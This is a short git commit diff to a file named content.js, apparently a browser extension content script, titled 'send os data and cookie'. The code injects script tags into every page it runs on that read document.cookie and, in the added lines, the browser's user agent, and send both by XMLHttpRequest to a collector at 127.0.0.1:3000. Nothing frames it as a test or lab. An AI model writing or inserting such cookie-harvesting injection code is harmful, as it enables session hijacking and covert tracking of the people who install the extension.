b29a970c491cfa22b3a6885ff8daeb10b2849be1
578101568@qq.com <578101568@qq.com>
2020-03-05 00:05:07 -0800

    send os data and cookie

--- content.js
+++ content.js
@@ -7,3 +7,6 @@
 var ss = document.createElement("script");
 ss.innerHTML= "var a = document.cookie;var xhr = new XMLHttpRequest();var url = 'http://127.0.0.1:3000?cookie='+a;xhr.open('GET',url, true);xhr.send()";
 document.documentElement.appendChild(ss);
+var ss2 = document.createElement("script");
+ss2.innerHTML= "var a = navigator.userAgent;var xhr = new XMLHttpRequest();var url = 'http://127.0.0.1:3000?osData='+a;xhr.open('GET',url, true);xhr.send()";
+document.documentElement.appendChild(ss2);
